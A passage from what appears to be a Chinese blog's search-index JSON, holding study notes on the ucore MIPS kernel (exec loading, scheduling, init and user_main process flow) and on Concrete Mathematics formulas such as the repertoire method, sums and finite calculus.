continue ;\n        }\n        off = start + PGSIZE - la, size = PGSIZE - off;\n        if (end &lt; la) {\n            size -= la - end;\n        }\n        memset(page2kva(page) + off, 0, size);\n        start += size;\n        assert((end &lt; la &amp;&amp; start == end) || (end &gt;= la &amp;&amp; start == la));\n    }\n\n    while (start &lt; end) {\n        if ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == NULL) {\n            ret = -E_NO_MEM;\n            goto bad_cleanup_mmap;\n        }\n        off = start - la, size = PGSIZE - off, la += PGSIZE;\n        if (end &lt; la) {\n            size -= la - end;\n        }\n        memset(page2kva(page) + off, 0, size);\n        start += size;\n    }\n</code></pre> </li> <li> <p>\u6620\u5c04\u7528\u6237\u6808\u7a7a\u95f4\uff08\u6dfb\u52a0 vma\uff0c\u5f53\u53d1\u751f pagefault \u65f6\uff0c\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u4f1a\u81ea\u52a8\u5206\u914d\u7269\u7406\u9875\uff09</p> <pre><code> vm_flags = VM_READ | VM_WRITE | VM_STACK;\n    if ((ret = mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, NULL)) != 0) {\n        goto bad_cleanup_mmap;\n    }\n</code></pre> </li> <li> <p>\u5c06\u51fd\u6570\u8c03\u7528\u53c2\u6570\u538b\u5165\u7528\u6237\u6808\u4e2d</p> <pre><code>   uintptr_t stacktop = USTACKTOP - argc * PGSIZE;\n    char **uargv = (char **)(stacktop - argc * sizeof(char *));\n    int i;\n    for (i = 0; i &lt; argc; i ++) {\n        uargv[i] = strcpy((char *)(stacktop + i * PGSIZE), kargv[i]);\n    }\n</code></pre> <p>\u4e0a\u4e00\u4e2a\u6b65\u9aa4\u5df2\u7ecf\u5c06 USTACKTOP \u6dfb\u52a0\u5230\u4e86 vma \u4e2d\u3002\u56e0\u6b64\u5728\u7b2c\u4e00\u6b21\u8bbf\u95ee\u7528\u6237\u6808\u65f6\u4f1a\u89e6\u53d1 pagefault\uff08\u9875\u8868\u4e2d\u6ca1\u6709\u6620\u5c04\u5173\u7cfb\uff09\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u52a8\u6001\u5206\u914d Page\u3002\u7b2c\u4e8c\u6b21\u8bbf\u95ee\u4f1a\u518d\u89e6\u53d1\u4e00\u6b21 tlb refill\uff0ctlb \u6dfb\u52a0\u6620\u5c04\u5173\u7cfb\uff0c\u4e4b\u540e\u4fbf\u53ef\u4ee5\u6b63\u5e38\u8bbf\u95ee\u4e86\u3002</p> </li> <li> <p>\u8bbe\u7f6e tf\u3002</p> <p>1. \u5c06 tf-&gt;tf_epc \u8bbe\u7f6e\u4e3a\u4e86 elf-&gt;e_entry\u3002\u56e0\u6b64\u5f02\u5e38\u8fd4\u56de\u65f6\u4fbf\u5f00\u59cb\u6267\u884c elf \u7a0b\u5e8f\u3002</p> <p>3. \u5728 tf-&gt;tf_status \u4e2d\u8bbe\u7f6e\u4e86 KSU_USER\uff0c\u56e0\u6b64\u4ece SYSCALL \u8fd4\u56de\u540e\uff0cCPU \u4f1a\u8f6c\u53d8\u4e3a\u7528\u6237\u6001\u3002</p> <pre><code> struct trapframe *tf = current-&gt;tf;\n    memset(tf, 0, sizeof(struct trapframe));\n\n    tf-&gt;tf_epc = elf-&gt;e_entry;\n    tf-&gt;tf_regs.reg_r[MIPS_REG_SP] = USTACKTOP;\n    uint32_t status = read_c0_status();\n    status &amp;= ~ST0_KSU;\n    status |= KSU_USER;     //\u53d8\u6210\u7528\u6237\u8fdb\u7a0b\n    status |= ST0_EXL;\n    tf-&gt;tf_status = status;\n    tf-&gt;tf_regs.reg_r[MIPS_REG_A0] = argc;\n    tf-&gt;tf_regs.reg_r[MIPS_REG_A1] = (uint32_t)uargv;\n</code></pre> </li> </ol> </li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u8c03\u5ea6","title":"\u8c03\u5ea6","text":"<p>\u6267\u884c\u5b8c proc_init \u540e\uff0c\u5df2\u7ecf\u521b\u5efa\u597d\u4e86\u4e24\u4e2a\u5185\u6838\u7ebf\u7a0b idle \u548c init\uff0c\u5e76\u4e14\u5f53\u524d\u6267\u884c\u7684\u7ebf\u7a0b\u4e3a proc_init\u3002\u5f53 ucore \u7684\u6240\u6709\u521d\u59cb\u5316\u5de5\u4f5c\u5b8c\u6210\u540e\uff0cucore \u6267\u884c kern_init \u7684\u6700\u540e\u4e00\u4e2a\u51fd\u6570 cpu_idle \u51fd\u6570\u3002cpu_idle \u4f1a\u8c03\u7528 schedule \u8ba9\u51fa CPU\u3002</p> <p>schedule \u5177\u4f53\u7684\u5b9e\u73b0\u6211\u4eec\u53ef\u4ee5\u4e0d\u5173\u5fc3\u3002\u6211\u4eec\u53ea\u9700\u8981\u77e5\u9053 sched_class_enqueue(proc) \u5c06\u4e00\u4e2a\u8fdb\u7a0b\u653e\u5165\u8fd0\u884c\u961f\u5217 run queue\u3002next = sched_class_pick_next() \u4ece rq \u4e2d\u627e\u5230\u4e0b\u4e00\u4e2a\u6267\u884c\u7684\u8fdb\u7a0b\u3002</p> <p>\u5f53\u9009\u5b9a\u9700\u8981\u6267\u884c\u7684\u8fdb\u7a0b\u540e\uff0cproc_run \u51fd\u6570\u5c06\u8be5\u8fdb\u7a0b\u8f7d\u5165 CPU \u6267\u884c\u3002</p> <pre><code>void\ncpu_idle(void) {\n    while (1) {\n        if (current-&gt;need_resched) {\n            schedule();\n        }\n    }\n}\n\nvoid\nschedule(void) {\n    bool intr_flag;\n    struct proc_struct *next;\n    local_intr_save(intr_flag);\n    {\n        current-&gt;need_resched = 0;\n        if (current-&gt;state == PROC_RUNNABLE) {\n            sched_class_enqueue(current);\n        }\n        if ((next = sched_class_pick_next()) != NULL) {\n            sched_class_dequeue(next);\n        }\n        if (next == NULL) {\n            next = idleproc;\n        }\n        next-&gt;runs ++;\n        if (next != current) {\n            //kprintf(\"########################\\n\");\n            //kprintf(\"c %d TO %d\\n\", current-&gt;pid, next-&gt;pid);\n            //print_trapframe(next-&gt;tf);\n            //kprintf(\"@@@@@@@@@@@@@@@@@@@@@@@@\\n\");\n            proc_run(next);\n        }\n    }\n    local_intr_restore(intr_flag);\n}\n\nvoid\nproc_run(struct proc_struct *proc) {\n    if (proc != current) {\n        bool intr_flag;\n        struct proc_struct *prev = current, *next = proc;\n        local_intr_save(intr_flag);\n        {\n          //panic(\"unimpl\");\n            current = proc;\n            //load_sp(next-&gt;kstack + KSTACKSIZE);\n            lcr3(next-&gt;cr3);\n            tlb_invalidate_all();       //\u6807\u6ce8\u4e00\u4e0b\u8fd9\u91cc\u7684 tlb \u6e05\u7a7a\uff0c\u5f85\u4f18\u5316\n            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context));\n        }\n        local_intr_restore(intr_flag);\n    }\n}\n</code></pre> <p>proc_run \u4f1a\u8c03\u7528 switch_to\uff0cswitch_to \u4f1a\uff1a</p> <ol> <li>\u5c06\u5f53\u524d\u7684 context \u5b58\u50a8\u5728 prev-&gt;context \u4e2d\u3002\uff08\u6ce8\u610f\uff0ccontext \u53ea\u5305\u542b s0-s8, sp, gp, ra\uff09</li> <li>\u6062\u590d next-&gt;context</li> <li>\u6267\u884c<code>j ra</code></li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#init-\u8fdb\u7a0b\u6267\u884c\u8fc7\u7a0b","title":"init \u8fdb\u7a0b\u6267\u884c\u8fc7\u7a0b","text":"<p>\u901a\u8fc7 kernel_thread(init_main, NULL, 0) \u521b\u5efa init \u8fdb\u7a0b\u540e</p> <ol> <li> <p>cpu_idle \u4e2d\uff08idle \u8fdb\u7a0b\u4e2d\uff09\uff0c\u6267\u884c schedule()\uff0c\u6b64\u65f6\u53ea\u6709 idle \u548c init \u4e24\u4e2a\u8fdb\u7a0b\uff0c\u56e0\u6b64\u8c03\u5ea6\u5230 init \u8fdb\u7a0b\u6267\u884c proc_run\u3002</p> </li> <li> <p>\u6267\u884c switch_to\uff0ckernel_thread \u8bbe\u7f6e\u4e86 context \u4e2d\u7684 sp, ra\u3002\u6267\u884c jr ra \u540e\uff0c\u8df3\u8f6c\u5230 forkret</p> <pre><code>// forkret -- the first kernel entry point of a new thread/process\n// NOTE: the addr of forkret is setted in copy_thread function\n//       after switch_to, the current proc will execute here.\nstatic void\nforkret(void) {\n    forkrets(current-&gt;tf);\n}\n\nforkrets:\n  addiu sp, a0, -16\n  b exception_return\n  nop\n</code></pre> </li> <li> <p>forkrets-&gt;exception_return \u4ece\u4e2d\u65ad\u8fd4\u56de\uff0c\u5f39\u51fa\u4e2d\u65ad\u5e27 tf\u3002CPU \u4fbf\u4f1a\u8fdb\u5165 kernel_thread_entry\uff0c\u5e76\u4ee5 tf \u4e2d\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u503c\u6267\u884c</p> </li> <li> <p>kernel_thread_entry \u8df3\u8f6c\u6267\u884c$a1 \u5373 init_main</p> <pre><code>//kern/proc/entry.S\nkernel_thread_entry:        # void kernel_thread(void)\n  addiu $sp, $sp, -16\n  jal $a1\n  nop\n  move $a0, $v0\n  la  $t0, do_exit\n  jal $t0 \n  nop\n  /* never here */\n</code></pre> </li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#user_main-\u7684\u6267\u884c\u8fc7\u7a0b","title":"user_main \u7684\u6267\u884c\u8fc7\u7a0b","text":"<ol> <li> <p>\u5728 init_main \u4e2d\uff0c\u521b\u5efa\u4e86 user_main \u7ebf\u7a0b\u3002\u7136\u540e init_main \u6267\u884c do_wait</p> <pre><code>// init_main - the second kernel thread used to create user_main kernel threads\nstatic int\ninit_main(void *arg) {\n ...\n    int pid = kernel_thread(user_main, NULL, 0);\n    if (pid &lt;= 0) {\n        panic(\"create user_main failed.\\n\");\n    }\n\n    while (do_wait(0, NULL) == 0) {\n        schedule();\n    }\n\n    fs_cleanup();\n    kprintf(\"all user-mode processes have quit.\\n\");\n    ...\n}\n</code></pre> </li> <li> <p>do_wait \u7684\u4f5c\u7528\u662f\u7b49\u5f85\u6307\u5b9a\u7684\u6216\u8005\u4efb\u610f\u4e00\u4e2a\uff08\u4f20\u5165\u7684 pid \u4e3a 0\uff09\u5b50\u7ebf\u7a0b\u8fdb\u5165 ZOMBIE \u72b6\u6001\uff0c\u91ca\u653e\u5b50\u8fdb\u7a0b\u7684\u5185\u6838\u6808\u7a7a\u95f4\u548c PCB \u7a7a\u95f4\u3002\u5426\u5219\uff0c\u81ea\u5df1\u8fdb\u5165\u7761\u7720\u72b6\u6001 SLEEPING\uff0c\u7136\u540e\u8c03\u7528 schedule()\u3002</p> <pre><code>// do_wait - wait one OR any children with PROC_ZOMBIE state, and free memory space of kernel stack\n//         - proc struct of this child.\n// NOTE: only after do_wait function, all resources of the child proces are free.\nint\ndo_wait(int pid, int *code_store)\n</code></pre> </li> <li> <p>schedule \u8c03\u7528\u5230 user_main \u7ebf\u7a0b\u3002\u548c init \u4e00\u6837\uff0c\u6267\u884c\u5230 user_main \u51fd\u6570\u3002</p> </li> <li> <p>user_main \u51fd\u6570\u8c03\u7528\u4e86 kernel_execv \u51fd\u6570\uff0c\u5b9e\u8d28\u4e3a\u4e00\u6b21 SYS_exec \u7cfb\u7edf\u8c03\u7528\u3002</p> </li> <li> <p>\u6700\u540e\u91cd\u65b0\u5206\u914d\u5185\u6838\u548c\u7528\u6237\u7a7a\u95f4\uff0c\u52a0\u8f7d\u4e86 sh \u7528\u6237\u7a0b\u5e8f\u3002user_main \u7ebf\u7a0b\u4ece\u5185\u6838\u7ebf\u7a0b\u53d8\u4e3a\u7528\u6237\u7ebf\u7a0b\u3002</p> </li> <li> <p>\u7528\u6237\u8fdb\u7a0b\u94fe\u63a5\u811a\u672c user.ld \u6307\u5b9a\u4e86 ENTRY(_start)\u3002_start \u5728 user/libs/initcode.S \u4e2d\u5b9a\u4e49\u3002</p> <pre><code>_start:\n    nop\n    la $gp, _gp\n    addiu $sp, $sp, -16\n    jal umain\n    nop\n</code></pre> <p>umain \u5728 user/libs/umain.c \u4e2d\u5b9a\u4e49</p> <pre><code>void\numain(int argc, char *argv[]) {\n    int fd;\n    if ((fd = initfd(0, \"stdin:\", O_RDONLY)) &lt; 0) {\n        warn(\"open &lt;stdin&gt; failed: %e.\\n\", fd);\n    }\n    if ((fd = initfd(1, \"stdout:\", O_WRONLY)) &lt; 0) {\n        warn(\"open &lt;stdout&gt; failed: %e.\\n\", fd);\n    }\n    int ret = main(argc, argv);\n    exit(ret);\n}\n</code></pre> </li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#ide_init--fs_init","title":"ide_init &amp; fs_init","text":"","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/","title":"\u5177\u4f53\u6570\u5b66","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5177\u4f53\u6570\u5b66\u516c\u5f0f\u5c0f\u518c\u5b50","title":"\u5177\u4f53\u6570\u5b66\u516c\u5f0f\u5c0f\u518c\u5b50","text":"<p>\u63a8\u5e7f\u4e00\u4e2a\u81ea\u5df1\u7684 github \u4ed3\u5e93\uff0c\u671f\u671b\u5171\u540c\u5b8c\u5584\u3002 \u9605\u8bfb\u5177\u4f53\u6570\u5b66\u7535\u5b50\u4e66\u7c4d\u65f6\uff0c\u7531\u4e8e\u7ecf\u5e38\u9700\u8981\u67e5\u770b\u67d0\u4e2a\u7f16\u53f7\u7684\u516c\u5f0f\u56e0\u6b64\u4ea7\u751f\u4e86\u8fd9\u4e2a\u9879\u76ee\uff0c\u7528\u4e8e\u9605\u8bfb\u65f6\u67e5\u9605\u516c\u5f0f https://github.com/TheRainstorm/concrete_math_formulas</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6210\u5957\u65b9\u6cd5","title":"\u6210\u5957\u65b9\u6cd5","text":"<p>\u5728\u5177\u4f53\u6570\u5b66 (Concrete Mathematics) \u8bfe\u672c\u4e2d\uff0c\u5728\u89e3\u7ea6\u745f\u592b\u9012\u63a8\u65b9\u7a0b\u65f6\uff0c\u7b2c\u4e00\u6b21\u4ecb\u7ecd\u4e86\u6210\u5957\u65b9\u6cd5 (repertoire method)\u3002\u4e4b\u540e\u4e5f\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\u6c42\u89e3\u5404\u79cd\u9012\u63a8\u65b9\u7a0b\u3002\u76f8\u4fe1\u5f88\u591a\u4eba\u7b2c\u4e00\u6b21\u770b\u5230\u8fd9\u79cd\u65b9\u6cd5\u65f6\u90fd\u4f1a\u611f\u89c9\u5230\u4e0d\u53ef\u601d\u8bae\u2014\u2014\u8fd8\u80fd\u8fd9\u6837\uff1f\u867d\u7136\u6bcf\u4e00\u6b65\u90fd\u80fd\u770b\u61c2\uff0c\u4f46\u662f\u5c31\u662f\u4e0d\u77e5\u9053\u8fd9\u79cd\u65b9\u6cd5\u662f\u600e\u4e48\u60f3\u5230\u7684\u3002\u5728\u67e5\u9605\u4e86\u4e00\u70b9\u8d44\u6599\u540e\uff0c\u6211\u5bf9\u8be5\u65b9\u6cd5\u6709\u4e86\u66f4\u591a\u7684\u8ba4\u8bc6\u3002\u5148\u8bf4\u660e\u4e00\u70b9\uff0c\u8be5\u65b9\u6cd5\u5e76\u4e0d\u662f\u4e00\u79cd\u4e07\u80fd\u65b9\u6cd5\uff0c\u5b9e\u9645\u4e0a\u8981\u6c42\u95ee\u9898\u8981\u6709\u7ebf\u6027\u7ed3\u6784\u3002</p> <p>\u53c2\u8003\uff1alinear algebra - Mathematical explanation for the Repertoire Method - Mathematics Stack Exchange</p> <ul> <li>\u4e3b\u8981\u601d\u8def\u662f\u7531\u7279\u89e3\u6784\u9020\u4e00\u822c\u89e3<ul> <li>\u7b80\u5355\u7684\uff0c\u4ee5$$ x_n = a_n + x_{n-1}$$   \u5219\u5bf9\u4e8e   $$   z_n = \\alpha a_n + \\beta b_n + z_{n-1}   $$   \\(z_n\\)\u7684\u89e3\u4e3a   $$   z_n = \\alpha x_n + \\beta y_n   $$</li> </ul> </li> <li>\u63a8\u5e7f\u540e     \u5bf9\u4e8e\u4ee5\u4e0b\u6c42\u89e3\\(x_n\\)\u7684\u95ee\u9898     $$     x_n = f(n) + g(x_{n-1}, x_{n-2}, ..., x_1)     $$     \u5176\u4e2d\\(g()\\)\u662f\u4e00\u4e2a\u7ebf\u6027\u51fd\u6570<p>\u6784\u9020\u51fa\\(k\\)\u4e2a repertoire\uff08\u53ef\u4ee5\u7406\u89e3\u4e3a\u7279\u89e3\uff09   $$   x_n^l = f^l(n) + g(x^l_{n-1}, x^l_{n-2}, ..., x^l_1), 0\\le l \\lt k   $$   \u4f7f\u5f97\u53ef\u4ee5   $$   f(n) = \\sum_{0\\le l \\lt k} \\lambda_l f^l(n)   $$   \u4ece\u800c   $$   x_n = \\sum_{0\\le l \\lt k} \\lambda_l x_n^l   $$ - \u5bf9\u4e8e\u539f\u672c\u7684\u7ea6\u745f\u592b\u95ee\u9898   $$   \\left{\\begin{array}{l}   f(1) = a \\   f(2n) = 2f(n) + b\\   f(2n+1) = 2f(n) + c\\   \\end{array}\\right.   $$   \u6709   $$   f(n) = aA(n) + bB(n) + cC(n)   $$   \u56e0\u6b64\uff0c\u5bf9\u4e8e\u4e0d\u540c\u7684 a, b, c \u7684\u7ebf\u6027\u7ec4\u5408\uff0c\u53ef\u4ee5\u5f97\u5230\u65b0\u7684\u9012\u63a8\u65b9\u7a0b\uff0c\u5176\u89e3\u4e5f\u662f\u4e0d\u540c\u7279\u89e3 f(n) \u7684\u7ebf\u6027\u7ec4\u5408</p> </li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5e94\u7528","title":"\u5e94\u7528","text":"<p>\u6c42\u89e3\u4e09\u6570\u53d6\u4e2d\u4f4d\u6570\u7248\u672c\u7684\u5feb\u901f\u6392\u5e8f\uff0c\u6bd4\u8f83\u6b21\u6570\u3002\u9012\u63a8\u516c\u5f0f\u5f88\u590d\u6742\uff0c\u4f46\u662f\u5374\u53ef\u4ee5\u5e94\u7528\u6210\u5957\u65b9\u6cd5\uff1alinear algebra - Mathematical explanation for the Repertoire Method - Mathematics Stack Exchange $$ x_{n}=n+1+\\frac{1}{\\left(\\begin{array}{c} n \\ 3 \\end{array}\\right)} \\sum_{1 \\leq k \\leq n}(k-1)(n-k)\\left(x_{k-1}+x_{n-k}\\right) $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6d4b\u8bd5-mathjax-\u548c-katex","title":"\u6d4b\u8bd5 MathJax \u548c KaTex","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#block","title":"block","text":"<pre><code>$$\n    x_n = a_n + x_{n-1} \\\\\n    y_n = b_n + y_{n-1} \\\\\n$$\n</code></pre> \\[     x_n = a_n + x_{n-1} \\\\     y_n = b_n + y_{n-1} \\\\ \\]","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#aligned","title":"aligned","text":"<pre><code>$$\n\\begin{align*}\n    \\sum_{k=1}^{n} k2^k &amp;= \\sum_{1\\le j\\le k \\le n} 2^k \\\\\n        &amp;= \\sum_{1\\le j\\le n} \\sum_{j \\le k \\le n} 2^k  &amp;&amp; \\text{//\u8003\u8651j, k \u8303\u56f4\u6784\u6210\u7684\u4e09\u89d2\u5f62}\\\\\n        &amp;= \\sum_{1\\le j\\le n} 2^j(2^{n-j+1} - 1) \\\\\n        &amp;= \\sum_{1\\le j\\le n} 2^{n+1} - 2^j \\\\\n        &amp;= n2^{n+1} - 2(2^n - 1) \\\\\n        &amp;= (n-1)2^{n+1}+2 \\\\\n\\end{align*}\n$$\n</code></pre> \\[ \\begin{align*}     \\sum_{k=1}^{n} k2^k &amp;= \\sum_{1\\le j\\le k \\le n} 2^k \\\\         &amp;= \\sum_{1\\le j\\le n} \\sum_{j \\le k \\le n} 2^k  &amp;&amp; \\text{//\u8003\u8651 j, k \u8303\u56f4\u6784\u6210\u7684\u4e09\u89d2\u5f62}\\\\         &amp;= \\sum_{1\\le j\\le n} 2^j(2^{n-j+1} - 1) \\\\         &amp;= \\sum_{1\\le j\\le n} 2^{n+1} - 2^j \\\\         &amp;= n2^{n+1} - 2(2^n - 1) \\\\         &amp;= (n-1)2^{n+1}+2 \\\\ \\end{align*} \\]","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#math-in-list","title":"math in list","text":"<pre><code>- list $$ z_n = \\alpha a_n + \\beta b_n + z_{n-1} $$\n- list\n    $$ z_n = \\alpha a_n + \\beta b_n + z_{n-1} $$\n</code></pre> <ul> <li>list $$ z_n = \\alpha a_n + \\beta b_n + z_{n-1} $$</li> <li>list     $$ z_n = \\alpha a_n + \\beta b_n + z_{n-1} $$</li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u548c\u5f0f","title":"\u548c\u5f0f","text":"<ul> <li>\u5c06\u4e00\u91cd\u548c\u5f0f\u53d8\u4e3a\u4e8c\u91cd\u548c\u5f0f\u7684\u4f8b\u5b50   $$   \\begin{align}       \\sum_{k=1}^{n} k2^k &amp;= \\sum_{1\\le j\\le k \\le n} 2^k \\           &amp;= \\sum_{1\\le j\\le n} \\sum_{j \\le k \\le n} 2^k  &amp;&amp; \\text{//\u8003\u8651 j, k \u8303\u56f4\u6784\u6210\u7684\u4e09\u89d2\u5f62}\\           &amp;= \\sum_{1\\le j\\le n} 2<sup>j(2</sup> - 1) \\           &amp;= \\sum_{1\\le j\\le n} 2^{n+1} - 2^j \\           &amp;= n2^{n+1} - 2(2^n - 1) \\           &amp;= (n-1)2^{n+1}+2 \\   \\end{align}   $$     p39   $$   \\begin{aligned}   S_{n} &amp;=\\sum_{1 \\leqslant k \\leqslant n} k^{2}=\\sum_{1 \\leqslant j \\leqslant k \\leqslant n} k \\   &amp;=\\sum_{1 \\leqslant j \\leqslant n} \\sum_{j \\leqslant k \\leqslant n} k \\   &amp;=\\sum_{1 \\leqslant j \\leqslant n}\\left(\\frac{j+n}{2}\\right)(n-j+1) \\   &amp;=\\frac{1}{2} \\sum_{1 \\leqslant j \\leqslant n}\\left(n(n+1)+j-j^{2}\\right) \\   &amp;=\\frac{1}{2} n^{2}(n+1)+\\frac{1}{4} n(n+1)-\\frac{1}{2} S_{n}=\\frac{1}{2} n\\left(n+\\frac{1}{2}\\right)(n+1)-\\frac{1}{2} S_{n}   \\end{aligned}   $$</li> </ul> <ul> <li> <p>p33   $$   S_{n}=\\sum_{1 \\leqslant j&lt;k \\leqslant n} \\frac{1}{k-j}   $$   \u65e0\u8bba\u662f\u5148\u5bf9 j \u6c42\u548c\uff0c\u8fd8\u662f\u5148\u5bf9 k \u6c42\u548c\uff0c\u6700\u7ec8\u90fd\u53ea\u80fd\u5bfc\u51fa\\(S_n = \\sum_{1\\le j&lt;n} H_j\\)</p> <p>\u5148\u7528 k \u66ff\u6362 k-j\uff0c\u7136\u540e\u5bf9 j \u5148\u6c42\u548c\u53ef\u4ee5\u5bfc\u51fa\\(S_n = nH_n - n\\)</p> </li> </ul> <ul> <li>aa<ul> <li>a   $$   \\sum_{\\substack{j \\in J \\ k \\in K}} a_{j} b_{k}=\\left(\\sum_{j \\in J} a_{j}\\right)\\left(\\sum_{k \\in K} b_{k}\\right)   $$</li> <li>b   $$   S \\nabla=\\sum_{1 \\leqslant j \\leqslant k \\leqslant n} a_{j} a_{k}=\\frac{1}{2}\\left(\\left(\\sum_{k=1}^{n} a_{k}\\right)<sup>{2}+\\sum_{k=1}</sup>\\right)   $$} a_{k}^{2</li> <li>c   $$   \\left(\\sum_{k=1}^{n} a_{k}\\right)\\left(\\sum_{k=1}^{n} b_{k}\\right)=n \\sum_{k=1}^{n} a_{k} b_{k}-\\sum_{1 \\leqslant j&lt;k \\leqslant n}\\left(a_{k}-a_{j}\\right)\\left(b_{k}-b_{j}\\right)   $$</li> </ul> </li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5dee\u5206","title":"\u5dee\u5206","text":"<ul> <li> <p>\u5fae\u5206 vs \u5dee\u5206   $$   Df(x) = \\lim_{h\\rightarrow0}{f(x+h) - f(x) \\over h}   $$</p> \\[ \\Delta f(x) = f(x+1) - f(x) \\] </li> </ul> <ul> <li>\u6709\u9650\u5b9a\u79ef\u5206\u542b\u4e49   $$   \\sum_a^b f(x)\\delta x = \\sum_{a\\le x&lt;b}f(x) = g(x)|_a^b   $$   \u5176\u4e2d   $$   \\Delta g(x) =  f(x)   $$</li> </ul> <ul> <li>\u4e0b\u964d\u5e42\u7684\u63a8\u5e7f   $$   \\begin{array}\\   x^2 &amp;= x(x-1) \\   x^1 &amp;= x \\   x^0 &amp;= 1 \\   x^{-1} &amp;= {1 \\over x+1} \\   x^{-2} &amp;= \\frac{1}{(x+1)(x+2)}   \\end{array}   $$   \u6ee1\u8db3\u6307\u6570\u52a0\u6cd5   $$   x<sup>{\\underline{m+n}}=x</sup>   $$}}(x-m)^{\\underline{n}</li> </ul> <ul> <li> <p>\u51e0\u4e2a\u51fd\u6570\u79ef\u5206</p> <p>\u4e0b\u964d\u5e42 $$ \\sum x^{\\underline{m}}\\delta x =  \\left{\\begin{array} \\  {x^{\\underline{m+1}} \\over m+1} &amp;m \\ne -1 \\  H(x) &amp;m=-1 \\  \\end{array}\\right. $$ \u6307\u6570 $$ \\sum c^x\\delta x = {c^x \\over c-1} $$</p> </li> </ul> <ul> <li>\u5206\u5e03\u79ef\u5206   $$   \\sum u\\Delta v = uv - \\sum E v \\Delta u   $$   \u5176\u4e2d E \u4e3a\u79fb\u4f4d\u7b97\u5b50\uff0c\\(Ef(x) = f(x+1)\\)</li> </ul> <ul> <li>\u5206\u5e03\u79ef\u5206\u4f8b\u5b50   $$   \\begin{aligned}   \\sum x H_{x} \\delta x &amp;=\\frac{x^{2}}{2} H_{x}-\\sum \\frac{(x+1)^{\\underline{2}}}{2} x^{\\underline{-1}} \\delta x \\   &amp;=\\frac{x^{2}}{2} H_{x}-\\frac{1}{2} \\sum x \\delta x \\   &amp;=\\frac{x^{2}}{2} H_{x}-\\frac{x^{2}}{4}+C   \\end{aligned}   $$</li> </ul> \\[ \\sum_{0 \\leq k&lt;n} k H_{k}=\\sum_{0}^{n} x H_{x} \\delta x=\\frac{n^{2}}{2}\\left(H_{n}-\\frac{1}{2}\\right) \\]","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5e95\u548c\u9876\u51fd\u6570\u6a21","title":"\u5e95\u548c\u9876\u51fd\u6570\u3001\u6a21","text":"<ul> <li> <p>a   $$   n=\\left\\lfloor\\frac{n}{m}\\right\\rfloor+\\left\\lfloor\\frac{n+1}{m}\\right\\rfloor+\\cdots+\\left\\lfloor\\frac{n+m-1}{m}\\right\\rfloor   $$</p> \\[ \\lfloor m x\\rfloor=\\lfloor x\\rfloor+\\left\\lfloor x+\\frac{1}{m}\\right\\rfloor+\\cdots+\\left\\lfloor x+\\frac{m-1}{m}\\right\\rfloor \\] </li> </ul> <ul> <li> <p>b   $$   \\sum_{0 \\leq k&lt;m}\\left\\lfloor\\frac{n k+x}{m}\\right\\rfloor=d\\left\\lfloor\\frac{x}{d}\\right\\rfloor+\\frac{m-1}{2} 